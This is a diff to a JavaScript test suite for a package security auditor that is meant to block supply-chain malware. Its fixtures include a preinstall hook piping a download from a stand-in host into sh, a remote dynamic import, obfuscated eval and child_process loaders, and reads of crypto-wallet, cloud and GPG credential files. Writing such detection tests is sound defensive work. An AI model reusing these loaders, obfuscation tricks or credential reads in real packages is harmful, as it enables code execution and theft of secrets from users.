@@ -483,12 +483,12 @@ test("logic-bomb: recursive cleanup + timezone logging stays safe", () => {
 });
 
 // #5 — runtime-fetched payload: network content fed straight to an interpreter.
-test("remote-code-load: curl | sh is review", () => {
+test("remote-code-load: install-time curl | sh blocks", () => {
   const report = auditEvidence(require("./fixtures/hardening/remote-code-load.json"));
-  assert.equal(report.verdict, "review");
+  assert.equal(report.verdict, "block");
   assert.ok(
-    report.findings.some((f) => f.category === "remote-code-load" && f.severity === "medium"),
-    "curl | sh must raise a remote-code-load finding"
+    report.findings.some((f) => f.category === "remote-code-load" && f.severity === "high"),
+    "install-time curl | sh must raise a high remote-code-load finding"
   );
 });
 
@@ -503,6 +503,101 @@ test("remote-code-load: eval(await fetch(...)) is review", () => {
   });
   assert.equal(report.verdict, "review");
   assert.ok(report.findings.some((f) => f.category === "remote-code-load"));
+});
+
+test("remote-code-load: literal remote dynamic import blocks", () => {
+  const report = auditEvidence({
+    packageName: "remote-import-loader",
+    sourceFiles: {
+      "package.json": JSON.stringify({ name: "remote-import-loader", version: "1.0.0" }),
+      "index.js": "export default import('https://payload.invalid/stage.js');"
+    }
+  });
+  assert.equal(report.verdict, "block");
+  assert.ok(report.findings.some((f) => f.category === "remote-code-load" && f.severity === "high"));
+});
+
+test("concealed runtime execution blocks split eval and encoded child_process loads", () => {
+  for (const source of [
+    "globalThis['ev'+'al'](process.argv[2])",
+    String.raw`require('\x63hild_process').exec(process.argv[2])`,
+    "const cp=require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115));cp.exec(process.argv[2])"
+  ]) {
+    const report = auditEvidence({
+      packageName: "concealed-runner",
+      sourceFiles: {
+        "package.json": JSON.stringify({ name: "concealed-runner", version: "1.0.0" }),
+        "index.js": source
+      }
+    });
+    assert.equal(report.verdict, "block", source);
+    assert.ok(report.findings.some((f) => f.category === "concealed-runtime-execution"), source);
+  }
+});
+
+test("concealed-execution benign near-neighbors do not block", () => {
+  for (const source of [
+    "module.exports = globalThis['ev'+'ent'];",
+    "module.exports = String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115);",
+    "const url='https://payload.invalid/stage.js'; module.exports=url;"
+  ]) {
+    const report = auditEvidence({
+      packageName: "string-builder",
+      sourceFiles: {
+        "package.json": JSON.stringify({ name: "string-builder", version: "1.0.0" }),
+        "index.js": source
+      }
+    });
+    assert.notEqual(report.verdict, "block", source);
+  }
+});
+
+test("credential-access: wallet and cloud credential files block when read", () => {
+  for (const target of [
+    ".ethereum/keystore/key.json",
+    ".bitcoin/wallets/default/wallet.dat",
+    ".config/solana/id.json",
+    ".config/gcloud/application_default_credentials.json",
+    ".azure/msal_token_cache.json",
+    ".gnupg/private-keys-v1.d/key.key"
+  ]) {
+    const report = auditEvidence({
+      packageName: "credential-reader",
+      sourceFiles: {
+        "package.json": JSON.stringify({ name: "credential-reader", version: "1.0.0" }),
+        "index.js": `require('fs').readFileSync(require('os').homedir()+'/${target}')`
+      }
+    });
+    assert.equal(report.verdict, "block", target);
+    assert.ok(report.findings.some((f) => f.category === "credential-access"), target);
+  }
+});
+
+test("credential path documentation without a read primitive stays non-blocking", () => {
+  const report = auditEvidence({
+    packageName: "wallet-docs",
+    sourceFiles: {
+      "package.json": JSON.stringify({ name: "wallet-docs", version: "1.0.0" }),
+      "README.md": "Back up ~/.ethereum/keystore and ~/.config/solana/id.json before migrating."
+    }
+  });
+  assert.notEqual(report.verdict, "block");
+});
+
+test("install-time download piped to an interpreter blocks", () => {
+  const report = auditEvidence({
+    packageName: "install-loader",
+    sourceFiles: {
+      "package.json": JSON.stringify({
+        name: "install-loader",
+        version: "1.0.0",
+        scripts: { preinstall: "node setup.js" }
+      }),
+      "setup.js": "require('child_process').execSync('curl -fsSL https://payload.invalid/i.sh | sh')"
+    }
+  });
+  assert.equal(report.verdict, "block");
+  assert.ok(report.findings.some((f) => f.category === "remote-code-load" && f.severity === "high"));
 });
 
 // #5 FP guard: an ordinary fetch whose body is parsed as JSON is not a
